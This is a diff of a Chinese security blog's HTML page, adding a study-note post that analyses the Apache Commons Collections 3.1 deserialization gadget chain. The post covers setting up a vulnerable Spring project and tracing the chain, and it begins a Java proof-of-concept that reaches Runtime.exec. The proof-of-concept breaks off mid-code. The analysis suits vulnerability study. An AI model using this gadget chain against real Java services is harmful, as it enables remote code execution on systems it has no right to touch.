@@ -6,15 +6,40 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | WisdomTree&#39;s Blog</title>
+  <title>Apache Commons Collections Deserialize Attack | WisdomTree&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="WisdomTree&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="java web反序列化开坑之旅！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Commons Collections Deserialize Attack">
+<meta property="og:url" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/index.html">
 <meta property="og:site_name" content="WisdomTree&#39;s Blog">
+<meta property="og:description" content="java web反序列化开坑之旅！">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/17.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/18.png">
+<meta property="og:image" content="https://p0sec.net/index.php/archives/121/">
+<meta property="og:image" content="https://xz.aliyun.com/t/2028#toc-2">
+<meta property="og:image" content="https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/">
+<meta property="og:updated_time" content="2019-03-21T00:35:54.169Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WisdomTree&#39;s Blog">
+<meta name="twitter:title" content="Apache Commons Collections Deserialize Attack">
+<meta name="twitter:description" content="java web反序列化开坑之旅！">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/1.png">
   
     <link rel="alternative" href="/atom.xml" title="WisdomTree&#39;s Blog" type="application/atom+xml">
   
@@ -150,177 +175,122 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-Apache-Commons-Collections-Deserialize-Attack" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Apache Commons Collections Deserialize Attack
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/" class="archive-article-date">
+
+        
+        <a href="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/" class="archive-article-date">
   	<time datetime="2019-03-20T11:21:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-20</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/">Apache Commons Collections Deserialize Attack</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
+        
+      </header>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/02/21/laravelv5-7反序列化rce/" class="archive-article-date">
-  	<time datetime="2019-02-21T09:21:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/02/21/laravelv5-7反序列化rce/">laravelv5.7反序列化rce(CVE-2019-9081)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/11/s2-045-调试分析/" class="archive-article-date">
-  	<time datetime="2019-01-11T05:41:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/11/s2-045-调试分析/">s2-045 调试分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
+    <div class="article-entry" itemprop="articleBody">
       
-        </div></section>
+        <blockquote>
+<p>java web反序列化开坑之旅！</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>IDEA创建<code>maven</code>项目：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/1.png" alt=""></p>
+<p>输入项目名：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/2.png" alt=""></p>
+<p>继续next：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/3.png" alt=""></p>
+<p>点击finish完成创建：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/4.png" alt=""></p>
+<p>在<code>src/main</code>下创建<code>java</code>和<code>resources</code>两个文件夹。并且将<code>resources</code>文件夹设置为资源文件：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/5.png" alt=""></p>
+<p>配置<code>pom.xml</code>文件，加载各个包（commons-collections 3.1存在漏洞）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springVersion</span>&gt;</span>4.1.1.RELEASE<span class="tag">&lt;/<span class="name">springVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;springVersion&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;springVersion&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;springVersion&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--springMVC的两个包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;springVersion&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;springVersion&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配置<code>web.xml</code>文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE web-app PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://java.sun.com/dtd/web-app_2_3.dtd" &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcher-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在<code>src/main/webapp/WEB-INF</code>文件夹下创建<code>views</code>文件夹以及<code>dispatcher-servlet.xml</code>文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.test"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jspViewResolver"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"viewClass"</span> <span class="attr">value</span>=<span class="string">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配置<code>tomcat</code>服务器：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/6.png" alt=""></p>
+<p>部署<code>war</code>包以及路径：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/7.png" alt=""></p>
+<p>创建<code>home</code>控制器：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/8.png" alt=""></p>
+<p>在<code>views</code>下创建相应的jsp文件：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/9.png" alt=""></p>
+<p>访问页面如下，搭建完毕：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/10.png" alt=""></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞的最终触发点在<code>org/apache/commons/collections/functors/InvokerTransformer.java</code>中的<code>transform</code>方法：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/11.png" alt=""></p>
+<p>这里很明显利用java的反射机制执行<code>input</code>方法。如此一来，按照正常的漏洞挖掘思路，应该在当前包中进行全局搜索该方法，看看哪些地方用到，并且参数可控。</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/12.png" alt=""></p>
+<p>可以在<code>org/apache/commons/collections/functors/ChainedTransformer.java</code>中看到一个<code>transform</code>方法，遍历<code>Transformer</code>,调用每一个<code>Transformer</code>元素的<code>transform</code>方法。并且将每一个元素的返回对象传入下一个元素继续进行反射调用，也就是说我们可以利用这一点形成一个反射调用链。这里也用于解决<code>Runtime</code>实例化对象不允许进行序列化的问题。这时候就可以想到当<code>Transformer</code>元素为<code>InvokerTransformer</code>类的对象，那就可以调用<code>InvokerTransformer</code>类中的<code>transform</code>方法。至此我们可以继续向上回溯<code>transform</code>方法，得益于前辈们的分析我们可以直接定位到<code>LazyMap</code>类。</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/14.png" alt=""></p>
+<p>在<code>LazyMap</code>类中调用<code>transform</code>方法，但遗憾的是这里的<code>get</code>方法并不是类似php中的魔术方法，并不能直接进行调用，因此我们需要继续向上延长我们的pop链。并且这里的<code>factory</code>并不是我们直接可控的，而是需要通过<code>LazyMap</code>中的<code>decorate</code>方法对其进行一个赋值。</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/15.png" alt=""></p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/16.png" alt=""></p>
+<p>在<code>org/apache/commons/collections/keyvalue/TiedMapEntry.java</code>中存在<code>getValue</code>方法，在该方法中调用<code>get</code>方法，而<code>getValue</code>方法在同类的<code>toString</code>方法中被调用。java中的<code>toString</code>方法和php中的<code>__toString</code>方法相同，都是在对象被当作字符串进行操作时自动调用。顺着这条思路继续，我们接下来就应该寻找<code>TiedMapEntry</code>类被当作字符串的场景，或者说寻找存在某个对象调用<code>toString</code>方法。</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/17.png" alt=""></p>
+<p>在<code>javax/management/BadAttributeValueExpException.java</code>类中可以找到两处<code>toString</code>方法，一处在其构造方法中，另一处就是我所定位的为止。巧合的是，恰好在重写的<code>readObject</code>方法中调用了<code>toString</code>方法。而众所周知，<code>readObject</code>方法可以用于反序列化的触发。至此完整的反序列化pop链已经呼之欲出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;</span><br><span class="line">      TiedMapEntry.toString-&gt;</span><br><span class="line">            TiedMapEntry.getValue-&gt;</span><br><span class="line">                  LazyMap.get-&gt;</span><br><span class="line">                        ChainedTransformer.transform-&gt;</span><br><span class="line">                              InvokerTransformer.transform</span><br></pre></td></tr></table></figure>
+<p>在构造具体的POC时需要注意，在<code>BadAttributeValueExpException</code>类中我们需要控制<code>val</code>属性。其实不光光时这里，所有的pop链的构造其本质都是面向属性编程，换句话来说我们可以默认为对象属性可控。但是这里的<code>val</code>属性是私有属性，并不能直接访问赋值，因此我们需要用这种方法来保证属性的可控：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valfield.set(poc, entry);</span><br></pre></td></tr></table></figure>
+<p>完整POC如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span 